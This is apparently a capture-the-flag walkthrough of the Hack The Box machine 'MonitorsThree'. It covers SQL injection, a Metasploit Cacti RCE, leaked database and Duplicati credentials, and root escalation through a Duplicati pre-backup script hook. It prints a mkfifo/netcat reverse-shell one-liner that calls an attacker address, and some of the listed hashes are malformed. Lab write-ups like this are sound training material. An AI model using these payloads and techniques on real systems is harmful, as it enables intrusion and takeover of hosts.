## MonitorsThree Hack the Box 10.129.67.153

### Enumeration

First I'll start with an nmap scan on the IP to determine open ports.

	#!/bin/bash

	TARGET=10.129.67.153 && nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) -A -vv $TARGET -oN nmap/nmap-all-tcp.nmap


	# Nmap 7.94SVN scan initiated Wed Sep 25 21:50:41 2024 as: nmap -p22,80,8084 -A -vv -oN nmap/nmap-all-tcp.nmap 10.129.67.153
	Nmap scan report for 10.129.67.153
	Host is up, received echo-reply ttl 63 (0.051s latency).
	Scanned at 2024-09-25 21:50:41 CDT for 13s

	PORT     STATE    SERVICE REASON         VERSION
	22/tcp   open     ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   256 86:f8:7d:6f:42:91:bb:89:72:91:af:72:f3:01:ff:5b (ECDSA)
	| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNwl884vMmev5jgPEogyyLoyjEHsq+F9DzOCgtCA4P8TH2TQcymOgliq7Yzf7x1tL+i2mJedm2BGMKOv1NXXfN0=
	|   256 50:f9:ed:8e:73:64:9e:aa:f6:08:95:14:f0:a6:0d:57 (ED25519)
	|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIN5W5QMRdl0vUKFiq9AiP+TVxKIgpRQNyo25qNs248Pa
	80/tcp   open     http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
	|_http-server-header: nginx/1.18.0 (Ubuntu)
	| http-methods: 
	|_  Supported Methods: GET HEAD POST OPTIONS
	|_http-title: Did not follow redirect to http://monitorsthree.htb/
	8084/tcp filtered websnp  no-response
	Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
	OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
	Aggressive OS guesses: Linux 5.0 (96%), Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%)
	No exact OS matches for host (test conditions non-ideal).
	TCP/IP fingerprint:
	SCAN(V=7.94SVN%E=4%D=9/25%OT=22%CT=%CU=37704%PV=Y%DS=2%DC=T%G=N%TM=66F4CC0E%P=aarch64-unknown-linux-gnu)
	SEQ(SP=FE%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)
	OPS(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11NW7%O6=M53CST11)
	WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
	ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)
	T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
	T2(R=N)
	T3(R=N)
	T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
	T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
	T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
	T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
	U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
	IE(R=Y%DFI=N%T=40%CD=S)

	Uptime guess: 10.313 days (since Sun Sep 15 14:19:41 2024)
	Network Distance: 2 hops
	TCP Sequence Prediction: Difficulty=254 (Good luck!)
	IP ID Sequence Generation: All zeros
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

	TRACEROUTE (using port 22/tcp)
	HOP RTT      ADDRESS
	1   53.20 ms 10.10.14.1
	2   53.23 ms 10.129.67.153

	Read data files from: /usr/bin/../share/nmap
	OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	# Nmap done at Wed Sep 25 21:50:54 2024 -- 1 IP address (1 host up) scanned in 13.45 seconds


From nmap we can only see 22, and 80. We also notice the IP (10.129.67.153) isn't redirecting to http://monitorsthree.htb/ so we can add this to our /etc/hosts file to fix this.

![hosts](/MonitorsThree/images/hosts.png) 

MonitorsThree homepage:

![Web](/MonitorsThree/images/homepage.png) 


### subdomain enumeration with ffuff

returns the 'cacti' subdomain. We'll also add this to our etc/hosts file.

![ffuf](/MonitorsThree/images/ffuf.png) 

running dirsearch against the cacti subdomain returns a /cacti directory. Lets check it out.

![dirsearch](/MonitorsThree/images/dirsearch.png) 


We can see the website is running cacti version 1.2.26

![cacti](/MonitorsThree/images/cacti.png) 


### Initial foothold



The username field on the website http://monitorsthree.htb is vulnerable to sqli. After running sqlmap we get the folling users and hashes.

admin:

hash: 31a181c8372e3afc59daa863430610d8,

mwatson

hash: c585d01f2eb3e6e1073O92023088a3dd,

janderson

hash: 1e68b6eb84b44d9

We can login to cacti with the following credentials.

Username: admin
Password: greencacti2001

With the metasploit module /exploit/multi/cacti_package_import_rce and the following options set I was able to get a meterpreter shell on the host.

![Foothold](/MonitorsThree/images/foothold.png) 

Once we can an inital shell on the host we can search for php config files using the following connmand and we are able to find a config.php file in /var/www/html/cacti and it has a mysql username of cactiuser. I tried multiple different passwords but ultimately the password is also cactiuser so we can gain access to mysql on the target.


![Foothold](/MonitorsThree/images/mysql.png) 

![Foothold](/MonitorsThree/images/enum-mysql.png) 

We can see there is a cacti database and within the cacti database there are several user* tables. 

![Foothold](/MonitorsThree/images/user-tables.png) 

If we select all from the user_auth table we can see hashes for admin, guest, and marcus users.

### Privilege Escalation

Duplicati is running on port 8200 on the MonitorsThree server. Let's local port forward 8200 to our attacker machine so we can more easily interact with it.


![Netstat](/MonitorsThree/images/netstat.png) 

Once we local port forward port 8200 to our attack machine we can see the duplicati logon page.

![Duplicati](/MonitorsThree/images/duplicati.png) 

Duplicati login

MonitorsThreeDuplicatiBackupPassword2024


Within Duplicate we can create a new backup under the Add backup section.

![Exploit](/MonitorsThree/images/backup2.png) 

I'll name the backup root_flag and make sure to set Encryption to No encryption.



For the Backup destination I'll change it to manual folder and put in a folder path of /source/tmp

![Exploit](/MonitorsThree/images/backup-dest.png) 

For the backp Source data we'll select Source data /root.

![Exploit](/MonitorsThree/images/backup-source.png) 

And for the bacup schedule just unselect 'Automatically run backups'.

![Exploit](/MonitorsThree/images/backup-schedule.png) 



I created the following exploit script and will add it to the /tmp directory of the target with scp.

![Exploit](/MonitorsThree/images/exploit.png) 

I set the permissions on the script to 755 and it is in the tmp directory on the target.

![Exploit](/MonitorsThree/images/setup.png)

Also make sure to set a listener on your attack machine in my case port 4444

1. Next from the duplicati web page from 'settings' we will enable 'run-script-before' 
2. Set path to /source/tmp/root.sh
3. our payload is already in the tmp directory on the target
4. Run 'cacti-backup' on 'Home' --> "run now"


![Exploit](/MonitorsThree/images/my-backup.png) 

hit ok, then from home screen we will run backup now

![Exploit](/MonitorsThree/images/root.png) 

	#!/bin/bash
	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.240 4444 >/tmp/f

For Priv-Esc (not just the root-flag, but shell as root):

Enable run-script-before on settings and set its Path to:

	/source/tmp/root.sh

Duplicati is running in docker the / is mounted on /source

I first checked in the root directory and noticed there was no flag and then remembered to go to source. But the above script should give you root privileges on the box and you can retreive the root flag.

![Exploit](/MonitorsThree/images/golder.png) 
